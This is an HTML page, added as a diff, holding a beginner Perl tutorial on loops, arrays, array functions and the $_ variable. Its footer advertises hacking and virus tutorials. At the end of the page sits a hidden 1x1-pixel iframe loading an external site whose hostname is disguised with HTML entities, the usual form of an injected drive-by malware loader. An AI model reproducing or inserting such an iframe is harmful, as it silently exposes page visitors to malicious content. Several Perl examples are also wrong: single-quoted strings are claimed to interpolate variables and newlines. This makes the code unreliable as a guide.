@@ -1,0 +1,199 @@
+<HTML>
+<HEAD>
+
+<TITLE>The Hacking Truths Manual: What they Don' teach you in Manuals!!!'</TITLE>
+
+</HEAD>
+<BODY LINK="#0000ff" VLINK="#800080">
+<FONT FACE="Arial">
+<P><b>The PERL (Almost Weekly) Manual: The 2<SUP>nd</SUP> Issue ---By Ankit Fadia
+</b> </FONT><b><A HREF="mailto:ankit@bol.net.in"><FONT FACE="Arial">ankit@bol.net.in</FONT></A></b></P>
+<P><b><font face="Arial"><a href="http://blacksun.box.sk">http://blacksun.box.sk</a></font></b></P>
+<P><FONT FACE="Arial">_____________________________________________________________________________</P>
+<P>Welcome to the second issue of The PERL (Almost Weekly) Manual. In the first issue I had given a general introduction to Perl and had covered basic Perl Topics.This Issue too concerns with nothing too Advanced but covers some Basic Perl things.This can be said to be a continuation of the first issue.Once you have a Sound Perl base, then it would become easier for you guys to understand the advanced important topics which will allow you to make some very useful programs.So I do suggest that you read these issues very carefully, so that you do not have any problems while reading the advanced topics.</P>
+<B><P>Loops</P>
+</B><P>Loops are very useful when you need to execute the same chunk of code or the same command over and over again. Say for example you want to print your name on the screen 5 times.You can do it by the following snippet of code:</P>
+<P>$scalarvar= 'Ankit\n' ; </P>
+<P>print '$scalarvar' ;</P>
+<P>print '$scalarvar' ;</P>
+<P>print '$scalarvar' ;</P>
+<P>print '$scalarvar' ;</P>
+<P>print '$scalarvar' ;</P>
+<P>The Above program will print Ankit on the screen five times(Each Ankit in a new line.), it will produce the desired result but the above code is really cumbersone and is not really efficient. Perl has many looping statements like the For-Next loop, the while loop and also the do while loop, which allow one to repeat a set of statements within the body of the loop to be repeated as long as a condition is being fulfilled.The above may sound a bit weird but read on and things will definitely become clearer.</P>
+<P><BR>
+<B>The While Loop</P>
+</B><P>Lets first go through the basic Syntax of the While loop</P>
+<P>while (Condition) { Body }</P>
+<P>This means that as long as the condition is true, the commands within the curly brackets i.e. the body of the while statement are executed. So now the earlier printing program can be rewritten as:</P>
+<P>$count='1';</P>
+<P>while ($count &lt;= 5) {</P>
+<P>print 'Ankit\n' ;</P>
+<P>$count++ ;</P>
+<P>}</P>
+<P>The while loop not only can be used to repeat a code snippet, it allows us to validate the user input and perform a certain pre defined task accouring to the result of the validation.This will become clearer after we consider the following scenario: Say you want to make a Perl Script which asks the user to enter the username and if and only if the username entered by the user is 'root' then display the system info. So to do the above we write the following script:</P>
+<P>print 'Username:' ;</P>
+<P>$user= &lt;&gt;;</P>
+<P>chomp $user;</P>
+<P>while ( $user eq "root" ) {</P>
+<P>print "System Ingo goes here:";</P>
+<P>}</P>
+<P>Output:</P>
+<P>Username:ankit</P>
+<P>Now as I entered ankit as the UserName the condition was not fulfilled and the body of the while statement was not executed.So lets see what happens if we type root as the Username.</P>
+<P>Output:</P>
+<P><BR>
+Username:root</P>
+<P>System Ingo goes here:System Ingo goes here:System Ingo goe</P>
+<P>es here:System Ingo goes here:System Ingo goes here:System</P>
+<P>Ingo goes here:System Ingo goes here:System Ingo goes here</P>
+<P>e:System Ingo goes here:System Ingo goes here:System Ingo g</P>
+<P>goes here:System Ingo goes here:System Ingo goes here:Syste</P>
+<P>em Ingo goes here:System Ingo goes here:System Ingo goes he</P>
+<P>ere:System Ingo goes here:System Ingo goes here:System Ingo</P>
+<P>o goes here:System Ingo goes here:System Ingo goes here:Sys</P>
+<P>stem Ingo goes here:System Ingo goes here:System Ingo goes</P>
+<P>here:System Ingo goes here:System Ingo goes here:System In</P>
+<P>ngo goes here:System Ingo goes here:System Ingo goes here:S</P>
+<P>System Ingo goes here:System Ingo goes here:System Ingo goe</P>
+<P>es here:System Ingo goes here:System Ingo goes here:System</P>
+<P>Ingo goes here:System Ingo goes here:System Ingo goes here</P>
+<P>e:System Ingo goes here:System Ingo goes here:System Ingo g</P>
+<P>goes here:System Ingo goes here:System Ingo goes here:Syste</P>
+<P>em Ingo goes here:System Ingo goes here:System Ingo goes he</P>
+<P>ere:System Ingo goes here:System Ingo goes here:System Ingo</P>
+<P>o goes here:System Ingo goes here:System Ingo goes here:Sys</P>
+<P>stem Ingo goes here:System Ingo goes here:System Ingo goes ^C</P>
+<P>Now what did happen here? Well when the Perl program asked for the Username, I entered root, so the scalar $user has the value root. Then the perl Interprator reaches the while statement and the condition evaluates to true, the body of the while statement is executed and the messages System Ingo goes here: is displayed once. After the message is printed, once the condition is evaluated again and as it once again evalutes to true as the scalar $user has the same value i.e. root and hence the body is executed once again. Thus like this the loop continues as the condition is always true and hence it becomes an infinte loop.</P>
+<P>Note: To get out of an infinite loop type CTRL + C.</P>
+<P>So while writing the while statement you need to keep in mind that the loop does not become an infinte one. So in order to print the message just once in the above example the Perl code will change to:</P>
+<P>print 'Username:' ;</P>
+<P>$user= &lt;&gt;;</P>
+<P>chomp $user;</P>
+<P>while ( $user eq "root" ) {</P>
+<P>print "System Ingo goes here:";</P>
+<P>$user=' Xyx';</P>
+<P>}</P>
+<P>So now once the message is printed once, the value of the scalar $user is changed and then when the codition is evaluated, as the value of $user is Xyz the codition is not fulfilled and hence the Body of the While Statement is not executed.</P>
+<B><P>The For Loop</P>
+</B><P>Basic Syntax of the For Loop would be:</P>
+<P>for (START; STOP ; ACTION) { Body }</P>
+<P>The above statement initialluy executes the START statement and then repeatedly executes the BODY statement as long as the STOP statement remains true. The ACTION statement is executed after every iteration.</P>
+<P>All this will become clearer after the following example:</P>
+<P>In this example we want to print all the alphabets from a to z.</P>
+<P>for($letter= 'a' ; $letter lt 'z' ; $letter++) {</P>
+<P>print $letter;</P>
+<P>}</P>
+<P>Explanation: First of the the for statement assigns the scalar $letter the value 'a' and then check if the scalar $letter is less than 'z' and if this is true then it executes the Body of the FOR statement i.e. it prints the value of $letter. Once the value of $letter has been printed on the screen, the value of $letter is increased by 1 i.e. the Action is executed.</P>
+<P>The syntax of the FOR statement is same as that used in other programming languages like C, C++ and JavaScript etc.</P>
+<B><P>Arrays </P>
+</B><P>You already know the first kind of Data Type, scalars. Although they are quite useful, they also have a dark side too, a single scalar can store only a single value, so in order to store 100 values we would have to have 100 scalars , which would make our programs very cumbersome, difficult to debug and difficult to understand and also difficult to manage. The answer to this problem is the use of Arrays which are a collection of related scalar values glued together. As the scalar variables begin with the $ sign, the Array variables begin with the @ sign. Thus any variable with a preceeding @ sign is an Array and any variable with the $sign is a scalar variable.</P>
+<P>Lets take an example of an array:</P>
+<P>@strings=('ankit', 'ankit2', ankit3');</P>
+<P>is an array of strings and has 3 elements.</P>
+<P>@nums=('34', '45', '65');</P>
+<P>is an array of numbers and has 3 elements.</P>
+<P>In Perl unlike in C an array can have mixed data types, i.e. it can contain both Numbers and strings.For example,</P>
+<P>@mixed=('23','54','Ankit','52');</P>
+<P>is a mixed array and has 4 elements.</P>
+<P>Individual elemts of an array can be referred to my using the following syntax:</P>
+<P>$newvar=$array1[x];</P>
+<P>The above statement assings the scalar $newvar the value contained by the x'th element of the array, 'array1'. Note that to refer to individual elements of an array we use the $ sign instead of the @ sign.</P>
+<P>Another thing to remember would be the fact that an array starts counting from zero, from that what I mean is that the first element of an array is referred to as the o'th element.The above will become clearer after the following examples:</P>
+<P>@array1=('I am first', 'I am second' , 'I am third', 'I am fourth');</P>
+<P>$var1=$array1[0];</P>
+<P>$var2=$array1[1];</P>
+<P>$var3=$array1[2];</P>
+<P>$var4=$array1[3];</P>
+<P>print $var1;</P>
+<P>print $var2;</P>
+<P>print $var3;</P>
+<P>print $var4;</P>
+<P>OutPut:</P>
+<P>I am firstI am secondI am thirdI am fourth</P>
+<P>This means that the o'th element is the first element in the array and the 1'th element is the 2'nd element in the array of values.</P>
+<P>For Example,</P>
+<P>@mixed=('23','54','Ankit','52');</P>
+<P>is a mixed array and has 4 elements</P>
+<P>Now the above mixed array contains 4 values, but Perl starts counting from 0, this means that $mixed[0] is 23 and $mixed[1] is 54 and $mixed[2] is Ankit and so on.</P>
+<P>NOTE: In $array[n], the n is known as the indice.</P>
+<P><BR>
+In Perl the indices can also be negative. For example,</P>
+<P>$array[-2];</P>
+<P>is the 2<SUP>nd</SUP> last element </P>
+<P>$array[-1];</P>
+<P>is the last element </P>
+<B><P>THE FOR EACH LOOP: Moving through an array</P>
+</B><P>In the above section, I had given an example in which we print various elements of an array by writing multiple print statements.That again is quite cumbersome and use of the For-Each loop makes your Perl programs easier to use i.e more efficient.</P>
+<P>The Basic Syntax of the For Each Loop would be the following:</P>
+<P>foreach SCALAR (ARRAY) { BODY }</P>
+<P>The above statement executes the commands in the BODY once for every ARRAY element. The current array element is placed in SCALAR.</P>
+<P>Lets take the following example in which we need to move through the entire array and print all it's values.</P>
+<P>@os = ('Windows', 'Linux' , 'MacOS' , 'BeOS');</P>
+<P>print 'Now Printing known Operating Systems:' ;</P>
+<P>foreach $os(@os) {</P>
+<P>print $os;</P>
+<P>}</P>
+<P>Output:</P>
+<P>Now Printing known Operating Systems:WindowsLinuxMacOSBeOS</P>
+<P>The for each loop is pretty self explanatory and is very useful for going through the contents of an array and printing them.</P>
+<B><P>Functions Associated with Arrays</P>
+</B><P>Perl comes with many in built functions that allow us to manipulate data in an array.</P>
+<B><P>push( ) and pop( )</P>
+</B><P>push( ARRAY, LIST) appends the LIST of data values to the end of an array.</P>
+<P>This means that for example,</P>
+<P>@array1=('123','456');</P>
+<P>push( @array1, 789);</P>
+<P>print $array1[-1];</P>
+<P>prints 789 on the screen and</P>
+<P>@array1=('123','456');</P>
+<P>push( @array1, 789,abc);</P>
+<P>print $array1[-1];</P>
+<P>prints abc on the screen.</P>
+<P>pop(ARRAY) removes and returns the last element of the ARRAY.</P>
+<P>As strings have the function chop(), arrays have the pop() function.</P>
+<B><P>unshift( ) and shift( )</P>
+</B><P>unshift( ARRAY, LIST) appends the LIST of elements to the beginning of the ARRAY.</P>
+<P>It can be said to be the opposite of push( ).</P>
+<P>shift( ARRAY) removes and returns the first element of the Array.</P>
+<P>It can be said to be the opposite of pop( ).</P>
+<B><P>splice( )</P>
+</B><P>The basic syntax of this function would be:</P>
+<P>splice(ARRAY,OFFSET,LENGTH,LIST) removes and returns LENGTH elements of ARRAY starting from OFFSET replacing them with LIST.</P>
+<P>For example,</P>
+<P>@array1=('1','2','3','4');</P>
+<P>print @array1;</P>
+<P>splice(@array1,2,2,a,a);</P>
+<P>print @array1;</P>
+<P>Output:</P>
+<P>123412aa</P>
+<P>The LENGTH and LIST arguments can be removed.The following examples make it more clear:</P>
+<P>splice(@array1,2);</P>
+<P>removes and returns all elements after 2 including 2.</P>
+<P>splice(@array1, 2, 2);</P>
+<P>removes and returns $array1[2] and $array1[3].</P>
+<B><P>Default Variables</P>
+</B><P>Perl is full of default variables, that one does not even have to define and are automatically defined by Perl and assigned a value.Well lets move on to the first of those.</P>
+<B><P>$_</P>
+</B><P>"The Programmer said that the programmer will start programming as soon as the programmer gets the Perl Editor"</P>
+<P>Read the above sentence and then read the below sentence:</P>
+<P>"The Programmer said that he will start programming as soon as he gets the Perl Editor"</P>
+<P>In the second sentect pronouns like he replaced the nouns and made the sentence better.</P>
+<P>Perl too unlike other programming languages has a default variable '$_' which solves the above problem.Lets take the example of the FOR EACH loop to undertand more about the $_ variable.</P>
+<P>Normally you would write something like the following:</P>
+<P>foreach $array(@array) { print $array; }</P>
+<P>Now with the use of the Default Variable $_ the above code will condense to:</P>
+<P>foreach(@array){print;}</P>
+<P>So what exactly happened? Well when the loop has no scalar before it, it uses the deafult variable $_ instead and the print function if not given any argument prints the value contained by $_.</P>
+<P>Thus as a result,</P>
+<P>print($_); and print; are the same and</P>
+<P>chomp($_); and chomp; are the same.</P>
+<P>Well that wraps up this week's Perl Journal. Next Week's issue is going to be on I\O and I will be discussing files and other I\O.</P>
+<P>Ankit Fadia</P>
+</FONT><P><A HREF="mailto:ankit@bol.net.in">ankit@bol.net.in</A></P>
+<FONT FACE="Arial"><P>To receive more tutorials on Hacking,Cracking, Perl, C++ and Viruses/Trojans and lottsa more join my mailing list:</P>
+<P>Send an email to programmingforhackers-subscribe@egroups.com to join it.</P>
+<P>Visit my Site to view all tutorials written by me at: <a href="http://www.crosswinds.net/~hackingtruths">http://www.crosswinds.net/~hackingtruths</a></P>
+
+</FONT><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
